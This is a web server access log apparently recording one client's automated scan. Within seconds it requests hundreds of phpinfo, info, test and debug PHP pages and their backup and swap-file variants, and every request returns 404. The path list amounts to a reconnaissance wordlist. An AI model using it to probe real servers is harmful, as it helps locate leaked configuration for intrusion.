043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:15;;/site/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:15;;/info1.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:16;;/site/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:16;;/site/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:16;;/diagnostic.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:16;;/site/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:16;;/debug.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:16;;/phptest.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:16;;/check.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:17;;/_profiler/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:17;;/php_version.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:17;;/pi.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:17;;/info2.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:17;;/php_info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:17;;/php.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:17;;/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:17;;/phpinfo.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:17;;/phpversion.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:17;;/info1.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:17;;/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:17;;/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:17;;/serverinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:17;;/info.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:17;;/i.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:17;;/test.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:17;;/server.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:17;;/php_info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:17;;/debug.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:17;;/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:17;;/test.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:17;;/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:17;;/php_info.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:17;;/info.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:17;;/check.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:17;;/test.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:17;;/php_info.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:17;;/phpinfo.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:17;;/phptest.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:17;;/diagnostic.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:17;;/info.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:17;;/phpinfo.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:17;;/php_info.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:17;;/php_info.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:17;;/test.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:17;;/phpinfo.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:17;;/info.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:17;;/php_info.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:17;;/phpinfo.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:17;;/test.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:17;;/info.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:17;;/test.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:17;;/php_info.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:17;;/info.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:17;;/phpinfo.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:17;;/phpinfo.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:17;;/php_info.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:17;;/info.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:17;;/php_version.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:17;;/test.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:17;;/phpinfo.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:17;;/php_info.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:18;;/php_info.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:18;;/admin/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:18;;/test.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:18;;/admin/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:18;;/serverinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:18;;/test.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:18;;/server.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:18;;/info.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:18;;/info.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:18;;/php_info.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:18;;/phpinfo.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:18;;/test.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:18;;/phpinfo.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:18;;/test.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:18;;/diagnostic.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:18;;/serverinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:18;;/info.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:18;;/debug.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:18;;/test.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:18;;/server.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:18;;/phptest.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:18;;/php_info.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:18;;/check.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:18;;/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:18;;/php_version.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:18;;/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:18;;/php_info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:19;;/php_info.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:19;;/test.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:19;;/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:19;;/phpinfo.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:19;;/_profiler/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:19;;/php_info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:19;;/info1.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:19;;/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:19;;/test.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:19;;/info2.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:19;;/php.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:19;;/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:20;;/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:20;;/info.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:20;;/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:20;;/_profiler/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:20;;/php_info.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:20;;/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:20;;/info.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:20;;/test.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:20;;/serverinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:20;;/diagnostic.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:20;;/test.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:20;;/php_version.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:20;;/php_info.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:20;;/info.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:20;;/test.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:20;;/i.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:20;;/phpinfo.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:20;;/info1.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:20;;/pi.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:20;;/info.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:20;;/php_info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:20;;/phpversion.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:20;;/phpinfo.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:20;;/phpinfo.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:20;;/php_info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:20;;/phpinfo.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:20;;/php_info.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:20;;/phptest.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:20;;/test.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:20;;/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:20;;/info.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:20;;/test.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:20;;/web/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:20;;/php_info.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:20;;/info2.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:20;;/server.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:20;;/check.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:20;;/debug.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:20;;/php.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:21;;/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:21;;/info.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:21;;/php_info.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:21;;/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:21;;/_profiler/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:21;;/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:21;;/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:21;;/php.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:21;;/php_info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:21;;/test.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:21;;/info2.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:21;;/info1.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:21;;/server.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:21;;/pi.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:21;;/php_version.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:21;;/phpversion.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:21;;/i.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:21;;/serverinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:21;;/debug.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:21;;/phpversion.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:21;;/php.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:21;;/pi.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:21;;/i.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:22;;/php_info.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:22;;/test/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:22;;/test/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:22;;/dev/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:22;;/admin/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:22;;/admin/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:22;;/test/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:22;;/phpinfo.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:22;;/admin/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:22;;/admin/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:22;;/dev/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:22;;/info.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:22;;/test.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:22;;/test/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:22;;/dev/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:22;;/admin/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:22;;/test.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:22;;/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:22;;/php_version.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:22;;/serverinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:22;;/diagnostic.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:22;;/debug.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:22;;/server.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:23;;/check.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:23;;/phptest.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:23;;/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:23;;/info.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:23;;/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:23;;/info.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:23;;/test.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:23;;/php_info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:23;;/test.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:23;;/phpinfo.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:23;;/php_info.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:23;;/phpinfo.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:23;;/info.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:23;;/test.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:23;;/info.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:23;;/test.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:23;;/test.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:23;;/info.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:23;;/info.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:23;;/test.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:23;;/php_info.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:23;;/php_info.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:23;;/test.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:23;;/info.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:23;;/php_info.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:23;;/phptest.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:23;;/phpinfo.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:23;;/phpinfo.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:23;;/test.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:23;;/phpinfo.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:23;;/php_info.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:23;;/info.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:23;;/admin/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:23;;/info.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:23;;/php_info.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:24;;/phpinfo.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:24;;/admin/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:24;;/php_info.php.tmp;GET;404
